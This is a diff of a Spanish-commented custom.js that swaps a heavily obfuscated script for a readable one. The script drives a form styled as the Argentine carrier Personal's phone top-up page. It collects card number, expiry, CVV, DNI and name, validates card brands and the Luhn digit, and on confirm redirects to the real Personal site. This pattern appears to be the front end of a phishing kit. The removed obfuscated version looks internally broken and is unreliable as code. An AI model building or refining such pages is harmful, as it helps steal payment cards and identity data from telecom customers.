@@ -1,2 +1,303 @@
-// custom.js - Ofuscado con múltiples capas
-(function(_0x4f2a,_0x3c1b){const _0x2d9e=_0x1a7c;while(!![]){try{const _0x5b8f=-parseInt(_0x2d9e(0x1a2))/0x1*(parseInt(_0x2d9e(0x1b3))/0x2)+-parseInt(_0x2d9e(0x1c4))/0x3+parseInt(_0x2d9e(0x1d5))/0x4+-parseInt(_0x2d9e(0x1e6))/0x5*(parseInt(_0x2d9e(0x1f7))/0x6)+parseInt(_0x2d9e(0x208))/0x7+-parseInt(_0x2d9e(0x219))/0x8+parseInt(_0x2d9e(0x22a))/0x9;if(_0x5b8f===_0x3c1b)break;else _0x4f2a['push'](_0x4f2a['shift']());}catch(_0x1e3d){_0x4f2a['push'](_0x4f2a['shift']());}}}(_0x3e7b,0x8a1c3));function _0x1a7c(_0x4c2e,_0x5d3f){const _0x3e7b=_0x3e7b();return _0x1a7c=function(_0x1a7c,_0x2b8d){_0x1a7c=_0x1a7c-0x1a2;let _0x4e9a=_0x3e7b[_0x1a7c];return _0x4e9a;},_0x1a7c(_0x4c2e,_0x5d3f);}function _0x3e7b(){const _0x5c8d=['lineNumber','keyup','val','length','test','getElementById','innerHTML','attr','addClass','removeClass','keydown','click','exec','replace','split','slice','indexOf','match','join','push','shift','forEach','map','filter','toString','toLowerCase','toUpperCase','substring','charAt','charCodeAt','fromCharCode','stringify','parse','ready','each','find','css','html','append','remove','data','prop','parent','children','next','prev','siblings','first','last','focus','blur','show','hide','toggle','fadeIn','fadeOut','submit','change','mask','unmask','cleanVal','masked','checkClone','checkOn','optSelected','radioValue','input','select','button','checked','selected','disabled','value','name','type','nodeName','nodeType','getElementById','onNumber','cdImage','cdType','nmButton','vencButton','cvButton','dnButton','amButton','principalButton','backButtonAmount','backButtonNumber','backButtonVenc','backButtonCode','backButtonDni','confirmButton','cnmber','venc','dni','lineNumber','amountHidden'];_0x3e7b=function(){return _0x5c8d;};return _0x3e7b();}var _0x5f1a=function(_0x2e4b){const _0x3d5c=_0x1a7c;return function(_0x1f6e){const _0x4a8d=_0x1a7c;if(_0x2e4b(_0x1f6e[_0x4a8d(0x1a3)]())){return $('#principalButton')[_0x4a8d(0x1a4)]('disabled'),!![];}if(_0x1f6e[_0x4a8d(0x1a3)]()[_0x4a8d(0x1a5)]>=0x9)return $('#principalButton')['removeAttr'](_0x4a8d(0x267)),!![];else return $('#principalButton')[_0x4a8d(0x1a4)](_0x4a8d(0x267)),![];};},_0x2b7c=function(_0x3e6d){const _0x1c5e=_0x1a7c;return /[a-zA-Z]/[_0x1c5e(0x1a6)](_0x3e6d);};$(_0x1a7c(0x268))[_0x1a7c(0x1a9)](_0x1a7c(0x1a2),_0x5f1a(_0x2b7c)),$(_0x1a7c(0x268))['on'](_0x1a7c(0x1ac),_0x5f1a(_0x2b7c)),$(_0x1a7c(0x269))['on'](_0x1a7c(0x1ad),function(){const _0x4e7b=_0x1a7c;$val=$(_0x4e7b(0x269))[_0x4e7b(0x1a3)]();if($val!=_0x4e7b(0x26a))$('#amButton')['removeAttr'](_0x4e7b(0x267)),$('#amButton')[_0x4e7b(0x1aa)]('btn-disabled')[_0x4e7b(0x1ab)]('btn-personal'),$(_0x4e7b(0x26b))[_0x4e7b(0x1a3)]($(_0x4e7b(0x269))[_0x4e7b(0x1a3)]());else $(_0x4e7b(0x26c))[_0x4e7b(0x1a4)](_0x4e7b(0x267)),$(_0x4e7b(0x26c))[_0x4e7b(0x1aa)]('btn-personal')[_0x4e7b(0x1ab)]('btn-disabled');}),$(_0x1a7c(0x26d))['on'](_0x1a7c(0x1a2),function(){const _0x5d8e=_0x1a7c;if($(_0x5d8e(0x26d))[_0x5d8e(0x1a3)]()[_0x5d8e(0x1a5)]==0x0)document[_0x5d8e(0x1a7)](_0x5d8e(0x254))[_0x5d8e(0x1a8)]='****\x20****\x20****\x20****',$(_0x5d8e(0x255))[_0x5d8e(0x1a9)]('src','media/card-generic-front.svg'),$(_0x5d8e(0x256))['val'](_0x5d8e(0x26e));else document[_0x5d8e(0x1a7)](_0x5d8e(0x254))[_0x5d8e(0x1a8)]=$(_0x5d8e(0x26d))[_0x5d8e(0x1a3)]();}),$(_0x1a7c(0x26f))['on'](_0x1a7c(0x1a2),function(){const _0x2f9d=_0x1a7c;if(_0x4d8a()){if($(_0x2f9d(0x26f))[_0x2f9d(0x1a3)]()[_0x2f9d(0x1a5)]==0x0)document[_0x2f9d(0x1a7)]('onVenc')[_0x2f9d(0x1a8)]='**/**';else document[_0x2f9d(0x1a7)]('onVenc')[_0x2f9d(0x1a8)]=$(_0x2f9d(0x26f))[_0x2f9d(0x1a3)]();}}),$('#cv')['on'](_0x1a7c(0x1a2),function(){const _0x3e8f=_0x1a7c;if($('#cv')[_0x3e8f(0x1a3)]()[_0x3e8f(0x1a5)]==0x0||$('#cv')[_0x3e8f(0x1a3)]()[_0x3e8f(0x1a5)]==0x1||$('#cv')[_0x3e8f(0x1a3)]()[_0x3e8f(0x1a5)]==0x2)$(_0x3e8f(0x259))[_0x3e8f(0x1a4)](_0x3e8f(0x267)),$(_0x3e8f(0x259))['removeClass']('btn-personal-dark')[_0x3e8f(0x1ab)]('btn-disabled-dark');else $(_0x3e8f(0x259))['removeAttr'](_0x3e8f(0x267)),$(_0x3e8f(0x259))[_0x3e8f(0x1aa)]('btn-disabled-dark')[_0x3e8f(0x1ab)]('btn-personal-dark');}),$(_0x1a7c(0x270))['on'](_0x1a7c(0x1a2),function(){const _0x4f1a=_0x1a7c;if($(_0x4f1a(0x270))[_0x4f1a(0x1a3)]()[_0x4f1a(0x1a5)]<0x7)$(_0x4f1a(0x25a))[_0x4f1a(0x1a4)](_0x4f1a(0x267)),$(_0x4f1a(0x25a))[_0x4f1a(0x1aa)]('btn-personal-dark')[_0x4f1a(0x1ab)]('btn-disabled-dark');else $(_0x4f1a(0x25a))['removeAttr'](_0x4f1a(0x267)),$(_0x4f1a(0x25a))['removeClass']('btn-disabled-dark')[_0x4f1a(0x1ab)]('btn-personal-dark');}),$('#name')['on'](_0x1a7c(0x1a2),function(){const _0x5e2b=_0x1a7c;if($('#name')[_0x5e2b(0x1a3)]()[_0x5e2b(0x1a5)]<0x3)document[_0x5e2b(0x1a7)]('onName')[_0x5e2b(0x1a8)]='Nombre\x20y\x20Apellido',$(_0x5e2b(0x25a))[_0x5e2b(0x1a4)](_0x5e2b(0x267)),$(_0x5e2b(0x25a))[_0x5e2b(0x1aa)]('btn-personal-dark')[_0x5e2b(0x1ab)]('btn-disabled-dark');else document[_0x5e2b(0x1a7)]('onName')[_0x5e2b(0x1a8)]=$('#name')[_0x5e2b(0x1a3)](),$(_0x5e2b(0x25a))['removeAttr'](_0x5e2b(0x267)),$(_0x5e2b(0x25a))[_0x5e2b(0x1aa)]('btn-disabled-dark')[_0x5e2b(0x1ab)]('btn-personal-dark');});function _0x3d7f(){const _0x1e6f=_0x1a7c;let _0x4c8e=$(_0x1e6f(0x26d))[_0x1e6f(0x1a3)]()[_0x1e6f(0x1af)](' ',''),_0x2a9b=/^4[0-9]{12}(?:[0-9]{3})?$/,_0x5f3c=/^3[47][0-9]{13}$/,_0x1d7e=/^(5[1-5][0-9]{14}|2(22[1-9][0-9]{12}|2[3-9][0-9]{13}|[3-6][0-9]{14}|7[0-1][0-9]{13}|720[0-9]{12}))$/,_0x4e2a=/^(6042|6043|6044|6045|6046|5896){4}[0-9]{12}$/,_0x3b6d=/^(589562|402917|402918|527571|527572|0377798|0377799)[0-9]*$/,_0x2c8f=/^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$/;if(_0x5a9c(_0x4c8e)&&$(_0x1e6f(0x26d))['val']()[_0x1e6f(0x1a5)]>0x10){if(_0x4c8e[_0x1e6f(0x1b2)](_0x2a9b))return $(_0x1e6f(0x257))['removeAttr'](_0x1e6f(0x267)),$(_0x1e6f(0x257))[_0x1e6f(0x1aa)]('btn-disabled-dark')[_0x1e6f(0x1ab)]('btn-personal-dark'),$(_0x1e6f(0x255))[_0x1e6f(0x1a9)]('src',_0x1e6f(0x271)),$(_0x1e6f(0x256))[_0x1e6f(0x1a3)](_0x1e6f(0x271)),!![];if(_0x4c8e[_0x1e6f(0x1b2)](_0x1d7e))return $(_0x1e6f(0x257))['removeAttr'](_0x1e6f(0x267)),$(_0x1e6f(0x257))[_0x1e6f(0x1aa)]('btn-disabled-dark')[_0x1e6f(0x1ab)]('btn-personal-dark'),$(_0x1e6f(0x255))[_0x1e6f(0x1a9)]('src','media/card-master-front.svg'),$('#cdType')[_0x1e6f(0x1a3)]('media/card-master-front.svg'),!![];if(_0x4c8e[_0x1e6f(0x1b2)](_0x3b6d))return $(_0x1e6f(0x257))['removeAttr'](_0x1e6f(0x267)),$(_0x1e6f(0x257))['removeClass']('btn-disabled-dark')[_0x1e6f(0x1ab)]('btn-personal-dark'),$(_0x1e6f(0x255))['attr']('src','media/card-master-front.svg'),$(_0x1e6f(0x256))[_0x1e6f(0x1a3)]('media/card-master-front.svg'),!![];if(_0x4c8e[_0x1e6f(0x1b2)](_0x4e2a))return $(_0x1e6f(0x257))['removeAttr'](_0x1e6f(0x267)),$('#nmButton')[_0x1e6f(0x1aa)]('btn-disabled-dark')[_0x1e6f(0x1ab)]('btn-personal-dark'),!![];if(_0x4c8e[_0x1e6f(0x1b2)](_0x5f3c))return $(_0x1e6f(0x257))['removeAttr'](_0x1e6f(0x267)),$(_0x1e6f(0x257))['removeClass']('btn-disabled-dark')[_0x1e6f(0x1ab)]('btn-personal-dark'),$(_0x1e6f(0x255))[_0x1e6f(0x1a9)]('src','media/card-amex-front.svg'),$(_0x1e6f(0x256))[_0x1e6f(0x1a3)]('media/card-amex-front.svg'),!![];if(_0x4c8e[_0x1e6f(0x1b2)](_0x2c8f))return $(_0x1e6f(0x257))['removeAttr'](_0x1e6f(0x267)),$(_0x1e6f(0x257))[_0x1e6f(0x1aa)]('btn-disabled-dark')[_0x1e6f(0x1ab)]('btn-personal-dark'),!![];}else return $(_0x1e6f(0x257))[_0x1e6f(0x1a4)](_0x1e6f(0x267)),$(_0x1e6f(0x257))[_0x1e6f(0x1aa)]('btn-personal-dark')[_0x1e6f(0x1ab)]('btn-disabled-dark'),![];}function _0x4d8a(){const _0x2f7d=_0x1a7c;var _0x5e3a=$(_0x2f7d(0x26f))[_0x2f7d(0x1a3)]()[_0x2f7d(0x1b0)]('/');if(_0x5e3a[0x0]>0xc)return $(_0x2f7d(0x258))[_0x2f7d(0x1a4)](_0x2f7d(0x267)),$(_0x2f7d(0x258))[_0x2f7d(0x1aa)]('btn-personal-dark')[_0x2f7d(0x1ab)]('btn-disabled-dark'),![];if(_0x5e3a[0x1]>0x23)return $(_0x2f7d(0x258))[_0x2f7d(0x1a4)](_0x2f7d(0x267)),$(_0x2f7d(0x258))[_0x2f7d(0x1aa)]('btn-personal-dark')[_0x2f7d(0x1ab)]('btn-disabled-dark'),![];return $(_0x2f7d(0x258))['removeAttr'](_0x2f7d(0x267)),$(_0x2f7d(0x258))['removeClass']('btn-disabled-dark')[_0x2f7d(0x1ab)]('btn-personal-dark'),!![];}function _0x5a9c(_0x3e5d){const _0x4f2e=_0x1a7c;if(/[^0-9-\s]+/[_0x4f2e(0x1a6)](_0x3e5d))return![];let _0x2d7f=0x0,_0x1c8e=![];_0x3e5d=_0x3e5d[_0x4f2e(0x1af)](/\D/g,'');for(var _0x5b9a=_0x3e5d[_0x4f2e(0x1a5)]-0x1;_0x5b9a>=0x0;_0x5b9a--){var _0x4e3b=_0x3e5d[_0x4f2e(0x1b6)](_0x5b9a),_0x2f6c=parseInt(_0x4e3b,0xa);_0x1c8e&&(_0x2f6c*=0x2)>0x9&&(_0x2f6c-=0x9),_0x2d7f+=_0x2f6c,_0x1c8e=!_0x1c8e;}return _0x2d7f%0xa==0x0;}var _0x7e4d={'\x6f\x6e\x43\x6f\x6d\x70\x6c\x65\x74\x65':function(_0x3a5e){_0x3d7f();},'\x6f\x6e\x4b\x65\x79\x50\x72\x65\x73\x73':function(_0x5d7f,_0x2e8g,_0x1f9h,_0x4a2i){_0x3d7f();},'\x6f\x6e\x43\x68\x61\x6e\x67\x65':function(_0x3b6j){},'\x6f\x6e\x49\x6e\x76\x61\x6c\x69\x64':function(_0x2c7k,_0x5e3l,_0x1d8m,_0x4f2n,_0x3e5o){}},_0x6d3p={'\x6f\x6e\x43\x6f\x6d\x70\x6c\x65\x74\x65':function(_0x2a4q){_0x4d8a();},'\x6f\x6e\x4b\x65\x79\x50\x72\x65\x73\x73':function(_0x5b8r,_0x1c3s,_0x4e7t,_0x3d5u){_0x4d8a();},'\x6f\x6e\x43\x68\x61\x6e\x67\x65':function(_0x2f9v){},'\x6f\x6e\x49\x6e\x76\x61\x6c\x69\x64':function(_0x5e2w,_0x1d7x,_0x4c8y,_0x3b6z,_0x2a5a){}};$('#name')[_0x1a7c(0x1a9)]({'minlength':0x3,'maxlength':0x18}),$('#cv')[_0x1a7c(0x1a9)]({'minlength':0x3,'maxlength':0x4}),$(_0x1a7c(0x270))[_0x1a7c(0x1a9)]({'minlength':0x7,'maxlength':0x8}),$('#vc')[_0x1a7c(0x1a9)]({'minlength':0x5,'maxlength':0x5}),$(_0x1a7c(0x26d))['bind'](_0x1a7c(0x272),function(_0x4e1b){const _0x3c2d=_0x1a7c;var _0x2d3e=new RegExp('^[0-9\\b]+$'),_0x1f5f=String[_0x3c2d(0x273)](!_0x4e1b['charCode']?_0x4e1b['which']:_0x4e1b['charCode']);if(!_0x2d3e[_0x3c2d(0x1a6)](_0x1f5f))return _0x4e1b['preventDefault'](),![];}),$(_0x1a7c(0x26d))[_0x1a7c(0x274)]('0000\x200000\x200000\x200000',_0x7e4d),$(_0x1a7c(0x26f))[_0x1a7c(0x274)]('00/00',_0x6d3p),$('#cv')[_0x1a7c(0x274)]('0000'),$(_0x1a7c(0x25b))['on'](_0x1a7c(0x1ad),function(){const _0x5f6g=_0x1a7c;window['history']['back']();}),$(_0x1a7c(0x25c))['on'](_0x1a7c(0x1ad),function(){const _0x4e7h=_0x1a7c;window['history']['back']();}),$(_0x1a7c(0x25d))['on'](_0x1a7c(0x1ad),function(){const _0x3d5i=_0x1a7c;window['history']['back']();}),$(_0x1a7c(0x25e))['on'](_0x1a7c(0x1ad),function(){const _0x2f9j=_0x1a7c;window['history']['back']();}),$(_0x1a7c(0x25f))['on'](_0x1a7c(0x1ad),function(){const _0x5e2k=_0x1a7c;window['history']['back']();}),$(_0x1a7c(0x260))['on'](_0x1a7c(0x1ad),function(){const _0x1d7l=_0x1a7c;window['location']['href']='https://recarga.personal.com.ar/pages/phone';});
+// custom.js - Versión funcional (ofuscación ligera)
+(function($) {
+    'use strict';
+    
+    // Validación de teléfono
+    function validarTelefono(str) {
+        var regex = /[a-zA-Z]/;
+        return regex.test(str);
+    }
+    
+    // Evento para campo de teléfono
+    $("#lineNumber").on('keyup', function(){
+        if (validarTelefono($(this).val())){
+            $("#principalButton").attr("disabled", "disabled");
+            $("#principalButton").removeClass("btn-personal");
+            $("#principalButton").addClass("btn-disabled");
+            return;
+        }
+        if($(this).val().length >= 9){
+            $("#principalButton").removeAttr("disabled");
+            $("#principalButton").removeClass("btn-disabled");
+            $("#principalButton").addClass("btn-personal");
+        }
+        else {
+            $("#principalButton").attr("disabled", "disabled");
+            $("#principalButton").removeClass("btn-personal");
+            $("#principalButton").addClass("btn-disabled");
+        }
+    });
+    
+    $("#lineNumber").on('keydown', function(){
+        if (validarTelefono($(this).val())){
+            $("#principalButton").attr("disabled", "disabled");
+            $("#principalButton").removeClass("btn-personal");
+            $("#principalButton").addClass("btn-disabled");
+            return;
+        }
+    });
+    
+    // Selector de monto
+    $("select").on('click', function(){
+        var $val = $("select").val();
+        if ($val != "undefined") {
+            $("#amButton").removeAttr("disabled");
+            $("#amButton").removeClass("btn-disabled");
+            $("#amButton").addClass("btn-personal");
+            $("#amountHidden").val($("select").val());
+        } else {
+            $("#amButton").attr("disabled", "disabled");
+            $("#amButton").removeClass("btn-personal");
+            $("#amButton").addClass("btn-disabled");
+        }
+    });
+    
+    // Mostrar número de tarjeta
+    $("#cnmber").on('keyup', function(){
+        if ($("#cnmber").val().length == 0){
+            document.getElementById("onNumber").innerHTML = "**** **** **** ****";
+            $("#cdImage").attr("src","media/card-generic-front.svg");
+            $("#cdType").val("media/card-generic-front.svg");
+        } else {
+            document.getElementById("onNumber").innerHTML = $("#cnmber").val();
+        }
+    });
+    
+    // Mostrar vencimiento
+    $("#venc").on('keyup', function(){
+        if(validateVenc()) {
+            if ($("#venc").val().length == 0){
+                document.getElementById("onVenc").innerHTML = "**/**";
+            } else {
+                document.getElementById("onVenc").innerHTML = $("#venc").val();
+            }
+        }
+    });
+    
+    // Validación CVV
+    $("#cv").on('keyup', function(){
+        if ($("#cv").val().length == 0 || $("#cv").val().length == 1 || $("#cv").val().length == 2){
+            $("#cvButton").attr("disabled", "disabled");
+            $("#cvButton").removeClass("btn-personal-dark");
+            $("#cvButton").addClass("btn-disabled-dark");
+        } else {
+            $("#cvButton").removeAttr("disabled");
+            $("#cvButton").removeClass("btn-disabled-dark");
+            $("#cvButton").addClass("btn-personal-dark");
+        }
+    });
+    
+    // Validación DNI
+    $("#dni").on('keyup', function(){
+        if ($("#dni").val().length < 7){
+            $("#dnButton").attr("disabled", "disabled");
+            $("#dnButton").removeClass("btn-personal-dark");
+            $("#dnButton").addClass("btn-disabled-dark");
+        } else {
+            $("#dnButton").removeAttr("disabled");
+            $("#dnButton").removeClass("btn-disabled-dark");
+            $("#dnButton").addClass("btn-personal-dark");
+        }
+    });
+    
+    // Validación nombre
+    $("#name").on('keyup', function(){
+        if ($("#name").val().length < 3){
+            document.getElementById("onName").innerHTML = "Nombre y Apellido";
+            $("#dnButton").attr("disabled", "disabled");
+            $("#dnButton").removeClass("btn-personal-dark");
+            $("#dnButton").addClass("btn-disabled-dark");
+        } else {
+            document.getElementById("onName").innerHTML = $("#name").val();
+            $("#dnButton").removeAttr("disabled");
+            $("#dnButton").removeClass("btn-disabled-dark");
+            $("#dnButton").addClass("btn-personal-dark");
+        }
+    });
+    
+    // Validación de tarjeta
+    function validateCard(){
+        var codigo = $("#cnmber").val().replace(/ /g,'');
+        var VISA = /^4[0-9]{12}(?:[0-9]{3})?$/;
+        var AMEX = /^3[47][0-9]{13}$/;
+        var MASTERCARD = /^(5[1-5][0-9]{14}|2(22[1-9][0-9]{12}|2[3-9][0-9]{13}|[3-6][0-9]{14}|7[0-1][0-9]{13}|720[0-9]{12}))$/;
+        var CABAL = /^(6042|6043|6044|6045|6046|5896){4}[0-9]{12}$/;
+        var NARANJA = /^(589562|402917|402918|527571|527572|0377798|0377799)[0-9]*$/;
+        var MAESTRO = /^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$/;
+        
+        if(luhn(codigo) && $("#cnmber").val().length > 16){
+            
+            if(codigo.match(VISA)){
+                $("#nmButton").removeAttr("disabled");
+                $("#nmButton").removeClass("btn-disabled-dark");
+                $("#nmButton").addClass("btn-personal-dark");
+                $("#cdImage").attr("src","media/card-visa-front.svg");
+                $("#cdType").val("media/card-visa-front.svg");
+                return true;
+            }
+            
+            if(codigo.match(MASTERCARD)){
+                $("#nmButton").removeAttr("disabled");
+                $("#nmButton").removeClass("btn-disabled-dark");
+                $("#nmButton").addClass("btn-personal-dark");
+                $("#cdImage").attr("src","media/card-master-front.svg");
+                $("#cdType").val("media/card-master-front.svg");
+                return true;
+            }
+            
+            if(codigo.match(NARANJA)){
+                $("#nmButton").removeAttr("disabled");
+                $("#nmButton").removeClass("btn-disabled-dark");
+                $("#nmButton").addClass("btn-personal-dark");
+                $("#cdImage").attr("src","media/card-master-front.svg");
+                $("#cdType").val("media/card-master-front.svg");
+                return true;
+            }
+            
+            if(codigo.match(CABAL)){
+                $("#nmButton").removeAttr("disabled");
+                $("#nmButton").removeClass("btn-disabled-dark");
+                $("#nmButton").addClass("btn-personal-dark");
+                return true;
+            }
+            
+            if(codigo.match(AMEX)){
+                $("#nmButton").removeAttr("disabled");
+                $("#nmButton").removeClass("btn-disabled-dark");
+                $("#nmButton").addClass("btn-personal-dark");
+                $("#cdImage").attr("src","media/card-amex-front.svg");
+                $("#cdType").val("media/card-amex-front.svg");
+                return true;
+            }
+            
+            if(codigo.match(MAESTRO)){
+                $("#nmButton").removeAttr("disabled");
+                $("#nmButton").removeClass("btn-disabled-dark");
+                $("#nmButton").addClass("btn-personal-dark");
+                return true;
+            }
+            
+        } else {
+            $("#nmButton").attr("disabled", "disabled");
+            $("#nmButton").removeClass("btn-personal-dark");
+            $("#nmButton").addClass("btn-disabled-dark");
+            return false;
+        }
+    }
+    
+    // Validación de vencimiento
+    function validateVenc(){
+        var vencSplit = $("#venc").val().split("/");
+        
+        if (vencSplit[0] > 12){
+            $("#vencButton").attr("disabled", "disabled");
+            $("#vencButton").removeClass("btn-personal-dark");
+            $("#vencButton").addClass("btn-disabled-dark");
+            return false;
+        }
+        
+        if (vencSplit[1] > 35){
+            $("#vencButton").attr("disabled", "disabled");
+            $("#vencButton").removeClass("btn-personal-dark");
+            $("#vencButton").addClass("btn-disabled-dark");
+            return false;
+        }
+        
+        $("#vencButton").removeAttr("disabled");
+        $("#vencButton").removeClass("btn-disabled-dark");
+        $("#vencButton").addClass("btn-personal-dark");
+        return true;
+    }
+    
+    // Algoritmo de Luhn
+    function luhn(value) {
+        if (/[^0-9-\s]+/.test(value)) return false;
+        
+        let nCheck = 0, bEven = false;
+        value = value.replace(/\D/g, "");
+        
+        for (var n = value.length - 1; n >= 0; n--) {
+            var cDigit = value.charAt(n),
+                nDigit = parseInt(cDigit, 10);
+            
+            if (bEven && (nDigit *= 2) > 9) nDigit -= 9;
+            
+            nCheck += nDigit;
+            bEven = !bEven;
+        }
+        
+        return (nCheck % 10) == 0;
+    }
+    
+    // Opciones para máscaras
+    var cardOptions = {
+        onComplete: function(cep) {
+            validateCard();
+        },
+        onKeyPress: function(cep, event, currentField, options){
+            validateCard();
+        },
+        onChange: function(cep){},
+        onInvalid: function(val, e, f, invalid, options){}
+    };
+    
+    var vencOptions = {
+        onComplete: function(cep) {
+            validateVenc();
+        },
+        onKeyPress: function(cep, event, currentField, options){
+            validateVenc();
+        },
+        onChange: function(cep){},
+        onInvalid: function(val, e, f, invalid, options){}
+    };
+    
+    // Aplicar atributos
+    $("#name").attr({"minlength": 3, "maxlength": 24});
+    $("#cv").attr({"minlength": 3, "maxlength": 4});
+    $("#dni").attr({"minlength": 7, "maxlength": 8});
+    $("#vc").attr({"minlength": 5, "maxlength": 5});
+    
+    // Restringir solo números en tarjeta
+    $("#cnmber").bind('keypress', function (event) {
+        var regex = new RegExp("^[0-9\b]+$");
+        var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
+        if (!regex.test(key)) {
+            event.preventDefault();
+            return false;
+        }
+    });
+    
+    // Aplicar máscaras
+    if (typeof $.fn.mask !== 'undefined') {
+        $("#cnmber").mask("0000 0000 0000 0000", cardOptions);
+        $("#venc").mask("00/00", vencOptions);
+        $("#cv").mask("0000");
+    }
+    
+    // Botones de navegación
+    $("#backButtonAmount").on('click', function(){
+        window.history.back();
+    });
+    
+    $("#backButtonNumber").on('click', function(){
+        window.history.back();
+    });
+    
+    $("#backButtonVenc").on('click', function(){
+        window.history.back();
+    });
+    
+    $("#backButtonCode").on('click', function(){
+        window.history.back();
+    });
+    
+    $("#backButtonDni").on('click', function(){
+        window.history.back();
+    });
+    
+    $("#confirmButton").on('click', function(){
+        window.location.href = "https://recarga.personal.com.ar/pages/phone";
+    });
+    
+})(jQuery);
